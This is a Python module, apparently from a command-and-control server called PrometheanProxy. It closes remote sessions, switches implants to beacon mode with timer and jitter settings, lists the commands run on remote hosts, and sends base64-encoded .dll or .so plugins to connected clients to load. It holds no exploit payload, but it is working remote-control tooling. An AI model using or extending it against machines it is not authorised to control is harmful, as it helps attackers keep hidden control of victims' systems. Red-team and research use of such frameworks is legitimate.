# ============================================================================
# Session Control Commands Module
# ============================================================================
# This module provides control commands for managing session state,
# including connection closure, beacon mode switching, and module loading.
# ============================================================================

# Standard Library Imports
import base64
import json
import os
import readline
import ssl
from typing import Tuple

# Third-Party Imports
import colorama

from ...global_objects import logger, obfuscation_map, tab_completion

# Local Module Imports
from ...utils.console import cprint, warn
from ...utils.console import error as c_error
from ..transfer import send_data

# ============================================================================
# ControlCommands Class
# ============================================================================


class ControlCommands:
    """
    Handles session state and control commands.

    Provides methods for closing sessions, switching to beacon mode,
    and loading modules into active sessions.
    """

    # ========================================================================
    # Session Management Methods
    # ========================================================================

    def close_connection(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """
        Close the current session after user confirmation.

        Sends a shutdown command to the client, removes the session from the
        active sessions list, and closes the connection socket.

        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
        """
        # Local import to prevent circular dependency
        from ..session import remove_connection_list

        logger.info(f"Closing connection {r_address[0]}:{r_address[1]}")
        confirm = input(
            "Are you sure you want to close the connection? (y/N): "
        ).lower()

        if confirm == "y":
            cprint(f"Closing {r_address[0]}:{r_address[1]}", fg="black", bg="yellow")
            try:
                send_data(conn, "shutdown")
                logger.info(f"Sent shutdown command to {r_address[0]}:{r_address[1]}")
            except Exception as e:
                logger.error(f"Error sending shutdown command to {r_address}: {e}")

            remove_connection_list(r_address)
            conn.close()
            cprint("Connection Closed", bg="green")
        else:
            cprint("Connection not closed.", bg="green")
        return

    def change_beacon(
        self, conn: ssl.SSLSocket, r_address: Tuple[str, int], uuid
    ) -> None:
        """
        Switch the current session to beacon mode.

        Sends a command to the client instructing it to switch from persistent
        session mode to asynchronous beacon mode. Also sends beacon configuration
        including URL, timer, and jitter values.

        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
            uuid: Unique identifier for the session/beacon
        """
        # Local import to prevent circular dependency
        import time

        from ..session import remove_connection_list

        # Get beacon configuration from config
        beacon_url = self.config.get("beacon_server", {}).get("url", "")
        if not beacon_url:
            # Try to construct from host and port
            beacon_host = self.config.get("beacon_server", {}).get("host", "localhost")
            beacon_port = self.config.get("beacon_server", {}).get("port", 8000)
            beacon_url = f"http://{beacon_host}:{beacon_port}"

        timer = self.config.get("beacon_server", {}).get("timer", 60)
        jitter = self.config.get("beacon_server", {}).get("jitter", 10)

        # Send beacon configuration along with switch command
        beacon_config = {
            "update": {"timer": timer, "jitter": jitter, "url": beacon_url}
        }

        logger.info(
            f"Sending beacon configuration to {r_address[0]}:{r_address[1]} - "
            f"URL: {beacon_url}, Timer: {timer}, Jitter: {jitter}"
        )

        # First send the configuration update
        try:
            send_data(conn, json.dumps(beacon_config))
            logger.info(f"Sent beacon configuration to {r_address[0]}:{r_address[1]}")

            # Wait for acknowledgment from client
            from ..transfer import receive_data

            ack_response = receive_data(conn)
            logger.info(f"Received update acknowledgment: {ack_response}")
        except Exception as e:
            logger.error(f"Failed to send beacon configuration: {e}")
            # Continue anyway to try sending switch command

        # Then send the mode switch command
        send_data(conn, "switch_beacon")
        logger.info(
            f"Sent 'switch to beacon mode' command to {r_address[0]}:{r_address[1]}"
        )

        # Update database to track mode switch
        try:
            self.database.update_entry(
                "connections",
                "connection_type=?, last_mode_switch=?, session_address=?",
                ("beacon", time.time(), None),
                "uuid=?",
                (uuid,),
            )
            logger.info(f"Updated database: Session {uuid} switched to beacon mode")
        except Exception as e:
            logger.error(f"Failed to update database for mode switch: {e}")

        cprint(f"Session {uuid} will now operate in beacon mode.", fg="green")
        cprint(
            f"Beacon URL: {beacon_url}, Timer: {timer}s, Jitter: {jitter}s", fg="cyan"
        )
        remove_connection_list(r_address)
        return

    # ========================================================================
    # Module Management Methods
    # ========================================================================

    # ========================================================================
    # Module Management Methods
    # ========================================================================

    def history(self, r_address: Tuple[str, int]) -> None:
        """
        Display command history for this session from the database.

        Retrieves and displays all executed commands for this session including
        command strings, execution status, and output from the database.

        Args:
            r_address: Remote address tuple (host, port)
        """
        logger.debug(f"Retrieving command history for session: {r_address}")

        try:
            # Convert address tuple to string for database lookup
            address_str = str(r_address)

            # Query database for all commands for this session
            placeholder = "%s" if self.database.db_type == "postgresql" else "?"
            query = f"SELECT command, command_uuid, executed, command_output FROM session_commands WHERE session_address = {placeholder}"
            self.database.cursor.execute(query, (address_str,))
            commands = self.database.cursor.fetchall()

            if not commands:
                cprint(
                    f"No command history found for session {r_address[0]}:{r_address[1]}",
                    fg="yellow",
                )
                logger.info(f"No command history found for session {r_address}")
                return

            # Display header
            cprint("\n" + "=" * 80, fg="cyan")
            cprint(
                f"Command History for Session: {r_address[0]}:{r_address[1]}", fg="cyan"
            )
            cprint("=" * 80, fg="cyan")

            # Display each command
            for idx, (command, cmd_uuid, executed, output) in enumerate(commands, 1):
                status_color = "green" if executed else "yellow"
                status_text = "Executed" if executed else "Pending"

                print(
                    f"\n{colorama.Fore.WHITE}[{idx}] Command: {colorama.Fore.MAGENTA}{command}"
                )
                print(f"    UUID: {colorama.Fore.BLUE}{cmd_uuid}")
                cprint(f"    Status: {status_text}", fg=status_color)

                if executed and output:
                    # Truncate long output for readability
                    max_output_len = 200
                    display_output = (
                        output
                        if len(output) <= max_output_len
                        else output[:max_output_len] + "..."
                    )
                    print(f"    Output: {colorama.Fore.WHITE}{display_output}")
                else:
                    cprint(f"    Output: Awaiting Response", fg="yellow")

            cprint("\n" + "=" * 80 + "\n", fg="cyan")
            logger.info(
                f"Displayed {len(commands)} commands from history for session {r_address}"
            )

        except Exception as e:
            logger.error(
                f"Error retrieving command history for session {r_address}: {e}"
            )
            c_error(f"Error retrieving command history: {e}")

        return

    def load_module_session(
        self, conn: ssl.SSLSocket, r_address: Tuple[str, int]
    ) -> None:
        """
        Interactively load a module into the current session.

        Presents the user with a list of available modules for the session's
        operating system and loads the selected module.

        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
        """

        def _resolve_module_base() -> str:
            """
            Resolve the base directory for modules.

            Returns:
                str: Path to the module base directory
            """
            candidates = [
                os.path.expanduser(self.config["server"].get("module_location", "")),
                os.path.expanduser("~/.PrometheanProxy/plugins"),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            return os.path.expanduser("~/.PrometheanProxy/plugins")

        command_location = _resolve_module_base()

        try:
            # ----------------------------------------------------------------
            # Determine Platform-Specific Settings
            # ----------------------------------------------------------------
            platform_folder = (
                "windows" if "windows" in self.operating_system else "linux"
            )
            ext = ".dll" if platform_folder == "windows" else ".so"
            channel = "debug" if "debug" in self.operating_system else "release"
            module_names = []

            # ----------------------------------------------------------------
            # Discover Available Modules
            # ----------------------------------------------------------------
            # Legacy layout: <base>/<os>/<channel>/*.ext
            legacy_linux = os.path.join(command_location, "linux")
            legacy_windows = os.path.join(command_location, "windows")

            if os.path.isdir(legacy_linux) or os.path.isdir(legacy_windows):
                module_dir = os.path.abspath(
                    os.path.join(command_location, platform_folder, channel)
                )
                files = [f for f in os.listdir(module_dir) if f.endswith(ext)]
                module_names = [
                    os.path.splitext(f)[0].removesuffix("-debug") for f in files
                ]
            else:
                # Unified layout: <name>/{release,debug}/{name}[-debug].ext
                for name in os.listdir(command_location):
                    full = os.path.join(command_location, name)
                    if not os.path.isdir(full):
                        continue
                    fname = f"{name}{'-debug' if channel == 'debug' else ''}{ext}"
                    cand = os.path.join(full, channel, fname)
                    if os.path.isfile(cand):
                        module_names.append(name)

            # Display available modules
            print("Available modules:")
            for name in module_names:
                print(f" - {name}")

        except Exception as e:
            logger.error(f"Error listing modules in {command_location}: {e}")
            print(f"Error listing modules in {command_location}: {e}")
            return

        # ----------------------------------------------------------------
        # Get User Selection
        # ----------------------------------------------------------------
        readline.set_completer(
            lambda text, state: tab_completion(
                text, state, list(module_names) + ["exit"]
            )
        )
        module_name = input("Enter the module name to load: ")
        if not module_name:
            print("No module name provided.")
            return
        if module_name in self.loaded_modules:
            print(f"Module '{module_name}' is already loaded.")
            return

        logger.debug(f"Loading module '{module_name}' from session.")
        self.load_module_direct_session(conn, r_address, module_name)

    def load_module_direct_session(
        self, conn: ssl.SSLSocket, r_address: Tuple[str, int], module_name: str
    ) -> None:
        """
        Load a specified module into the session without user interaction.

        Resolves the module file path, reads the module binary, encodes it,
        and sends it to the session for loading.

        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
            module_name: Name of the module to load
        """

        def _resolve_module_base() -> str:
            """
            Resolve the base directory for modules.

            Returns:
                str: Path to the module base directory
            """
            candidates = [
                os.path.expanduser(self.config["server"].get("module_location", "")),
                os.path.expanduser("~/.PrometheanProxy/plugins"),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            return os.path.expanduser("~/.PrometheanProxy/plugins")

        # ----------------------------------------------------------------
        # Resolve Module Path
        # ----------------------------------------------------------------
        base = os.path.abspath(_resolve_module_base())
        platform_folder = "windows" if "windows" in self.operating_system else "linux"
        ext = ".dll" if platform_folder == "windows" else ".so"
        channel = "debug" if "debug" in self.operating_system else "release"

        # Unified layout: <name>/{release,debug}/{name}[-debug].ext
        filename = f"{module_name}{'-debug' if channel == 'debug' else ''}{ext}"
        module_path = os.path.join(base, module_name, channel, filename)

        # ----------------------------------------------------------------
        # Fallback to Legacy Structure if Needed
        # ----------------------------------------------------------------
        if not os.path.isfile(module_path):
            legacy_base = os.path.expanduser(
                self.config["server"].get("module_location", "")
            )
            if platform_folder == "windows":
                legacy_try = os.path.join(
                    legacy_base,
                    "windows",
                    channel,
                    f"{module_name}{'-debug' if channel == 'debug' else ''}.dll",
                )
            else:
                legacy_try = os.path.join(
                    legacy_base,
                    "linux",
                    channel,
                    f"{module_name}{'-debug' if channel == 'debug' else ''}.so",
                )
            if os.path.isfile(legacy_try):
                module_path = legacy_try

        module_path = os.path.abspath(os.path.expanduser(module_path))
        logger.info(f"Loading module '{module_name}' from {module_path}")

        # ----------------------------------------------------------------
        # Load and Send Module
        # ----------------------------------------------------------------
        if module_name not in self.loaded_modules:
            self.loaded_modules.append(module_name)

        try:
            with open(module_path, "rb") as module_file:
                file_data = module_file.read()

            # Encode binary module data as base64 and serialize payload to JSON
            encoded_data = base64.b64encode(file_data).decode("ascii")
            payload = {"module": {"name": module_name, "data": encoded_data}}
            send_data(conn, payload)

            # Track loaded module
            if module_name not in self.loaded_modules:
                self.loaded_modules.append(module_name)

        except FileNotFoundError:
            logger.error(f"Module file '{module_path}' not found.")
            print(f"Module file '{module_path}' not found.")
        except Exception as e:
            logger.error(f"Error loading module '{module_name}': {e}")
            print(f"Error loading module '{module_name}': {e}")
